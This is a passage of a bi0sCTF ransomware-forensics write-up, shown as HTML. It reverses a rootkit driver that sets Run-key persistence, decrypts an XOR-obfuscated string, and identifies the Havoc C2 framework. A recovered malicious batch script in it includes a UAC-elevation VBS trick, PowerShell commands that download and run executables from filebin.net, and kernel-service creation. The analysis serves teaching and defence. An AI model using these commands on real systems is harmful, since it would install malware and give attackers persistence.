+<p>As we have figured out the dropped files, we can see that the driver/rootkit is the one responsible for setting up the persistence. Let&rsquo;s analyze the file <code>fJSW4lQS.sys</code> in ida.</p>
+<p>####DriverEntry:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="kr">__stdcall</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">DriverObject</span><span class="p">,</span> <span class="n">PUNICODE_STRING</span> <span class="n">RegistryPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sub_140005000</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">sub_1400014BC</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">DriverObject</span><span class="p">,</span> <span class="n">RegistryPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>the first subroutine is the usual msvc security cookie setup and the second subroutine is the main function which is responsible for setting up the persistence.</p>
+<p>After reversing and going through other subrotuine calls, we can come across an interesting function which has this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_140001070</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-1E8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">NTSTATUS</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+44h] [rbp-1E4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+44h] [rbp-1E4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-1E0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+4Ch] [rbp-1DCh]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">KeyHandle</span><span class="p">;</span> <span class="c1">// [rsp+50h] [rbp-1D8h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="nc">_OBJECT_ATTRIBUTES</span> <span class="n">ObjectAttributes</span><span class="p">;</span> <span class="c1">// [rsp+58h] [rbp-1D0h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="nc">_UNICODE_STRING</span> <span class="n">DestinationString</span><span class="p">;</span> <span class="c1">// [rsp+88h] [rbp-1A0h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="nc">_UNICODE_STRING</span> <span class="n">ValueName</span><span class="p">;</span> <span class="c1">// [rsp+98h] [rbp-190h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="nc">_UNICODE_STRING</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+A8h] [rbp-180h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v11</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span> <span class="c1">// [rsp+B8h] [rbp-170h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v12</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [rsp+BDh] [rbp-16Bh] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int16</span> <span class="n">v13</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+C0h] [rbp-168h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">Data</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// [rsp+100h] [rbp-128h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v15</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// [rsp+140h] [rbp-E8h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v16</span><span class="p">[</span><span class="mi">62</span><span class="p">];</span> <span class="c1">// [rsp+180h] [rbp-A8h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v17</span><span class="p">[</span><span class="mi">62</span><span class="p">];</span> <span class="c1">// [rsp+1C0h] [rbp-68h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"> <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DestinationString</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">Registry</span><span class="se">\\</span><span class="s">Machine</span><span class="se">\\</span><span class="s">SOFTWARE</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">CurrentVersion</span><span class="se">\\</span><span class="s">Run&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ObjectAttributes</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="mi">48</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ObjectAttributes</span><span class="p">.</span><span class="n">RootDirectory</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ObjectAttributes</span><span class="p">.</span><span class="n">Attributes</span> <span class="o">=</span> <span class="mi">576</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ObjectAttributes</span><span class="p">.</span><span class="n">ObjectName</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">DestinationString</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ObjectAttributes</span><span class="p">.</span><span class="n">SecurityDescriptor</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ObjectAttributes</span><span class="p">.</span><span class="n">SecurityQualityOfService</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="n">ZwCreateKey</span><span class="p">(</span><span class="o">&amp;</span><span class="n">KeyHandle</span><span class="p">,</span> <span class="mi">2u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ObjectAttributes</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ValueName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;dscord&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">qmemcpy</span><span class="p">(</span><span class="n">Data</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">cKGzX4VI.exe&#34;</span><span class="p">,</span> <span class="mh">0x3Au</span><span class="n">i64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ZwSetValueKey</span><span class="p">(</span><span class="n">KeyHandle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ValueName</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="n">Data</span><span class="p">,</span> <span class="mh">0x3Au</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;stem&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">qmemcpy</span><span class="p">(</span><span class="n">v15</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">TwCSXWiv.exe&#34;</span><span class="p">,</span> <span class="mh">0x3Au</span><span class="n">i64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="n">ZwSetValueKey</span><span class="p">(</span><span class="n">KeyHandle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="n">v15</span><span class="p">,</span> <span class="mh">0x3Au</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">qmemcpy</span><span class="p">(</span><span class="n">v13</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;;4ÔMr/K7=3Ân;V*.9)ÔYwBCU)%ÑK0h&#34;</span><span class="p">,</span> <span class="mi">62u</span><span class="n">i64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">qmemcpy</span><span class="p">(</span><span class="n">v16</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;6bdZuC2L3D9iaoiFRGvIs85l3AlOKf&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v16</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">qmemcpy</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;YJNX0YlObWFf4oMkFnpR4I5BhYc8Qj&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v17</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x24</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1E</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8D</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1B</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">qmemcpy</span><span class="p">(</span><span class="n">v12</span><span class="p">,</span> <span class="s">&#34;:H?&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v12</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1Fu</span><span class="n">i64</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v1</span> <span class="o">=</span> <span class="n">v11</span><span class="p">[</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">40</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">      <span class="o">++</span><span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v13</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">v1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&gt;=</span> <span class="mi">8</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v5</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ZwClose</span><span class="p">(</span><span class="n">KeyHandle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_mm_lfence</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;CKey failed with status 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>to summarize, it set&rsquo;s up run key persistence for the executables <code>C:\\Windows\\Temp\\cKGzX4VI.exe</code> and <code>C:\\Windows\\Temp\\TwCSXWiv.exe</code> and also sets up a secret string that I fixed from being a qword to wchar_t and we can also get the key and doing the XOR operation on the string we can get the decrypted string.</p>
+<p>As we have got the desired part and there is nothing much to look into the driver, we can move on to solving this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">     <span class="n">decrypted</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">         <span class="n">char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span> <span class="o">+</span> <span class="mi">40</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">         <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="n">decrypted</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">encrypted_str</span> <span class="o">=</span> <span class="s2">&#34;;4ÔMr/K7=3Ân;V*.9)ÔYwBCU)%ÑK0h&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">36</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">63</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"> <span class="n">decrypted_str</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_str</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decrypted:&#34;</span><span class="p">,</span> <span class="n">decrypted_str</span><span class="p">)</span>
+</span></span></code></pre></div><p>We have a string <code>;4ÔMr/K7=3Ân;V*.9)ÔYwBCU)%ÑK0h</code> that is being XORed with the key <code>[36, 30, 141, 2, 27, 58, 72, 63]</code>. Each element in the key is added with 40 before being XORed with the string. The String after being decrypted is <code>wrag1M;PquwDx4ZIuoas4 32ecdas</code> and we get its md5 hash.</p>
+<pre tabindex="0"><code>
+Answer Q9) fJSW4lQS.sys_33241f9fe44881e934c5e083389ebc1e_010a74fa8bdceda1de467132b1cddbdf
+</code></pre><h3 class="group head-tag" id="question-10">Question 10<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-10"></a></h3><p>Q10) What is the C2 framework used, and what is the file name of the executable, what is the sleep technique used?</p>
+<p>Format : C2-framework(all-lowercase)_executable-name_sleep-technique(case-sensitive)</p>
+<p>The obfuscated batch file (<code>sAmhUAB2.bat</code>) file which was dropped by <code>WDjmIG5L.exe</code> downloaded and executed 2 executables the ransomware <code>TwCSXWiv.exe</code> and  <code>cKGzX4VI.exe</code> which can be either tracked with behaviour analysis or looking into the timeline we made.</p>
+<p>we can also recover it atleast partially like this with some deobfuscation and pattern matching</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat"><span class="line"><span class="cl">??<span class="p">&amp;</span><span class="k">cls</span>
+</span></span><span class="line"><span class="cl"><span class="p">@</span><span class="nv">%pUBlIcs983%%PUBLicGCHo^ of^%</span>PuBlICt616%f
+</span></span><span class="line"><span class="cl"><span class="k">SEt</span> <span class="nv">R</span><span class="p">^=</span>Jg<span class="se">^%</span>pUBLIcu<span class="se">^g</span>tGXz<span class="nv">%pUBLIctw%</span>pUBLIch<span class="se">^h</span>m%pUBLIcb<span class="se">^S^H</span>I<span class="se">^O^A</span>
+</span></span><span class="line"><span class="cl"><span class="se">^%</span>pUBlICS<span class="se">^L</span><span class="nv">%pUBliCG517%</span><span class="se">^%</span>publIct
+</span></span><span class="line"><span class="cl"><span class="p">@</span><span class="se">^e^c</span>~15<span class="se">^O</span> <span class="se">^O</span>n
+</span></span><span class="line"><span class="cl"><span class="p">@</span><span class="k">echo</span> off
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&gt;</span>nul <span class="mi">2</span><span class="p">&gt;&amp;</span><span class="mi">1</span> <span class="s2">&#34;</span><span class="nv">%SYSTEMROOT%</span><span class="s2">\system32\cacls.exe&#34;</span> <span class="s2">&#34;</span><span class="nv">%SYSTEMROOT%</span><span class="s2">\system32\config\system&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nv">%errorlevel%</span> <span class="ow">neq</span> 0 <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> Set UAC = CreateObject<span class="se">^(</span><span class="s2">&#34;Shell.Application&#34;</span><span class="se">^)</span> <span class="p">&gt;</span> <span class="s2">&#34;</span><span class="nv">%temp%</span><span class="s2">\getadmin.vbs&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> UAC.ShellExecute <span class="s2">&#34;</span><span class="nv">%~s0</span><span class="s2">&#34;</span> <span class="s2">&#34;&#34;</span> <span class="s2">&#34;&#34;</span> <span class="s2">&#34;runas&#34;</span> 1 <span class="p">&gt;&gt;</span> <span class="s2">&#34;</span><span class="nv">%temp%</span><span class="s2">\getadmin.vbs&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="nv">%temp%</span><span class="s2">\getadmin.vbs&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span> /B
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">cd</span>  C\Windows\Temp
+</span></span><span class="line"><span class="cl">PowerShell -Command <span class="s2">&#34;iw1 &#39;https://filebin.net/lfc6u585h3jmqfpp/ware&#39; -OutFile TwCSXWiv.exe&#34;</span>
+</span></span><span class="line"><span class="cl">.\TwCSXWiv.exe
+</span></span><span class="line"><span class="cl">PowerShell -Command <span class="s2">&#34;iw1 &#39;https://filebin.net/lfc6u585h3jmqfpp/cKGzX4VI&#39; -OutFile cKGzX4VI.exe &#34;</span>
+</span></span><span class="line"><span class="cl">.\cKGzX4VI.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">SET</span> <span class="nv">dr</span><span class="p">=</span>systm
+</span></span><span class="line"><span class="cl"><span class="k">SET</span> <span class="nv">dlp</span><span class="p">=</span><span class="nv">%APPDATA%</span>\Local\WndService\f~0SW4lQS.sys
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sc create <span class="nv">%dr%</span> type= kernel start= demand DisplayName= <span class="s2">&#34;TaT&#34;</span> binPath= <span class="nv">%dlp%</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sc start <span class="nv">%dr%</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sc stop <span class="nv">%dr%</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">@</span><span class="k">echo</span> off
+</span></span><span class="line"><span class="cl"><span class="k">set</span> <span class="nv">a </span><span class="p">=</span> <span class="se">%%</span>~i
+</span></span><span class="line"><span class="cl"><span class="k">set</span> <span class="nv">a </span><span class="p">=</span> <span class="nv">% + %</span>~i<span class="s2">&#34;r = </span><span class="nv">% + %</span><span class="s2">~i&#34;</span>%
+</span></span><span class="line"><span class="cl"><span class="k">set</span> <span class="nv">a </span><span class="p">=</span> <span class="nv">%a%</span>
+</span></span><span class="line"><span class="cl">aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
+</span></span></code></pre></div><p>then, cKGzX4VI.exe on initial analysis tells us that it is packed with VMProtect. After unpacking it using the similar method used for url.exe in question 5 as both are packed with vmprotect without any virtualisation, we can perform Triage analysis as well as sandboxing and find out that it uses havoc framework. For the sleep-technique used you can either bruteforce from the couple techniques it supports or we can reverse the executable and get the sleep technique used. As well basic static analysis of different APIs specifically used for different sleep techniques that havoc supports.</p>
+<pre tabindex="0"><code>Answer Q10) havoc_cKGzX4VI.exe_WaitForSingleObjectEx
+</code></pre><h2 class="group head-tag" id="flag">Flag:<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#flag"></a></h2><p><code>bi0sctf{H4Ha_N0w_Th4t_1s_Th3_Punchl1n3_0f_Th3_J0k3_1snt_1t?_2d9fe9}</code></p>
+<h2 class="group head-tag" id="closing-note">Closing Note<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#closing-note"></a></h2><p>Thank you to everyone who tried the challenge. We thank you for playing the CTF and would love to hear some feedback about the challenge.
+If you have any queries regarding the challenge, feel free to hit me up over twitter/discord.</p>
+<p><strong>Contact</strong>: Azr43lKn1ght | 
+<a
+  href="https://twitter.com/Azr43lKn1ght"
+  
+    target="_blank"
+  
+  >twitter</a
+>
+ | 
+<a
+  href="https://www.linkedin.com/in/azr43lkn1ght?utm_source=share&amp;utm_campaign=share_via&amp;utm_content=profile&amp;utm_medium=android_app"
+  
+    target="_blank"
+  
+  >Linkedin</a
+>
+ | 
+<a
+  href="https://github.com/Azr43lKn1ght"
+  
+    target="_blank"
+  
+  >github</a
+>
+</p>
+
+        </div>
+
+        
+        <div
+          class="flex flex-col justify-start px-1 pb-5 pt-1 md:px-3 lg:flex-row lg:justify-between lg:px-10">
+          
+          
+          
+            <div class="flex flex-row flex-wrap items-center">
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/bi0sctf/"
+                  >Bi0sCTF</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/ransomware/"
+                  >Ransomware</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/threat-hunting/"
+                  >Threat Hunting</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/ransomware-analysis/"
+                  >Ransomware Analysis</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/ransomware-investigtion/"
+                  >Ransomware Investigtion</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/ransomware-recovery/"
+                  >Ransomware Recovery</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/reverse-engineering/"
+                  >Reverse Engineering</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/incident-response/"
+                  >Incident Response</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/malware-analysis/"
+                  >Malware Analysis</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/windows-forensics/"
+                  >Windows Forensics</a
+                >
+              
+                <a
+                  class="mx-1 my-0.5 rounded-lg border border-gray-200 px-1.5 py-1 text-center text-xs text-gray-600 hover:bg-gray-100 dark:border-gray-500 dark:text-gray-200 dark:hover:bg-gray-600"
+                  href="http://localhost:1313/tags/rootkit-analysis/"
+                  >Rootkit Analysis</a
+                >
+              
+            </div>
+          
+
+        </div>
+      </div>
+    </div>
+
+    
+    
+  </div>
+<div data-dial-init class="group fixed bottom-24 end-8 md:end-20">
+  <div
+    id="speed-dial-menu-bottom-right"
+    class="mb-4 flex hidden flex-col items-center space-y-2">
+    
+    
+      <button
+        id="to-top-button"
+        type="button"
+        data-tooltip-target="tooltip-top"
+        data-tooltip-placement="left"
+        class="flex hidden h-[52px] w-[52px] items-center justify-center rounded-full border border-gray-200 bg-white text-gray-500 shadow-sm hover:bg-gray-50 hover:text-gray-900 focus:outline-none focus:ring-4 focus:ring-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600 dark:hover:text-white dark:focus:ring-gray-400">
+        <svg
+          class="h-5 w-5"
+          aria-hidden="true"
+          fill="currentColor"
+          viewBox="0 0 1024 1024"
+          version="1.1"
+          xmlns="http://www.w3.org/2000/svg">
+          <path
